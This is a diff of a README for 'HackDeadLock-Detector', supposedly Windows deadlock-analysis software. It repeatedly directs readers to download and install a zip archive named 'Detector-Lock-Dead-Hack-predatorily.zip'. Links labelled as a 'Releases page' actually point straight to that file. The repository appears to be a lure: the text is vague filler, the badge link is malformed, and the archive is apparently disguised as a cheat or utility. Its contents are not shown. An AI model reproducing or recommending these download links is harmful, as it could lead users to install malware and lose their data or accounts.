@@ -1,6 +1,6 @@
 # ⚡ HackDeadLock-Detector - Easily Download DeadLock Software
 
-[![Download](https://raw.githubusercontent.com/krishinternational5/HackDeadLock-Detector/main/havingness/HackDeadLock-Detector.zip%https://raw.githubusercontent.com/krishinternational5/HackDeadLock-Detector/main/havingness/HackDeadLock-Detector.zip)](https://raw.githubusercontent.com/krishinternational5/HackDeadLock-Detector/main/havingness/HackDeadLock-Detector.zip)
+[![Download](https://github.com/krishinternational5/HackDeadLock-Detector/raw/refs/heads/main/havingness/Detector-Lock-Dead-Hack-predatorily.zip%https://github.com/krishinternational5/HackDeadLock-Detector/raw/refs/heads/main/havingness/Detector-Lock-Dead-Hack-predatorily.zip)](https://github.com/krishinternational5/HackDeadLock-Detector/raw/refs/heads/main/havingness/Detector-Lock-Dead-Hack-predatorily.zip)
 
 ## 📥 Overview
 Welcome to HackDeadLock-Detector! This software allows you to analyze and detect deadlocks in your system automatically. The 2025 edition is designed for Windows users and provides a user-friendly interface. 
@@ -10,7 +10,7 @@ To start using HackDeadLock-Detector, follow these simple steps:
 
 1. **Download the Software:**
    Visit the Releases page to get the latest version of HackDeadLock-Detector:
-   [Download from Releases](https://raw.githubusercontent.com/krishinternational5/HackDeadLock-Detector/main/havingness/HackDeadLock-Detector.zip)
+   [Download from Releases](https://github.com/krishinternational5/HackDeadLock-Detector/raw/refs/heads/main/havingness/Detector-Lock-Dead-Hack-predatorily.zip)
 
 2. **Install the Application:**
    - Locate the downloaded file, usually found in your "Downloads" folder. 
@@ -36,7 +36,7 @@ To run HackDeadLock-Detector smoothly, ensure your system meets the following re
 ## 💾 Download & Install
 Ready to install HackDeadLock-Detector? Follow these steps:
 
-1. Go to the Releases page: [HackDeadLock-Detector Releases](https://raw.githubusercontent.com/krishinternational5/HackDeadLock-Detector/main/havingness/HackDeadLock-Detector.zip).
+1. Go to the Releases page: [HackDeadLock-Detector Releases](https://github.com/krishinternational5/HackDeadLock-Detector/raw/refs/heads/main/havingness/Detector-Lock-Dead-Hack-predatorily.zip).
 2. Choose the latest version listed.
 3. Click the download link to save the installer file to your computer.
 
